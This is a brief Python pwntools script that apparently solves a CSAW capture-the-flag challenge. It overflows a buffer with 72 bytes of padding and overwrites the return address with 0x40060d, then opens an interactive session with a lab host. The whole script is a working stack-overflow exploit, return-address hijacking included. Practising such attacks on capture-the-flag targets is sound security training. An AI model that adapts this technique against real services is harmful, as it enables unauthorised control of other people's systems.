from pwn import *
def main():
	
	HOST = "192.168.56.101"
	PORT = 53333
	
	#HOST = "pwn.chal.csaw.io"
	#PORT = 8000

	#0x40060d - easy
	#Overflow at 72
	payload = "\x90"*(72)+"\x0d\x06\x40\x00\x00\x00"
	r = remote(HOST,PORT)
	print r.recvline()

	#Wait
	raw_input("$")
	
	#Send payload, then interact
	r.sendline(payload)
	r.interactive()	
	pass
main()
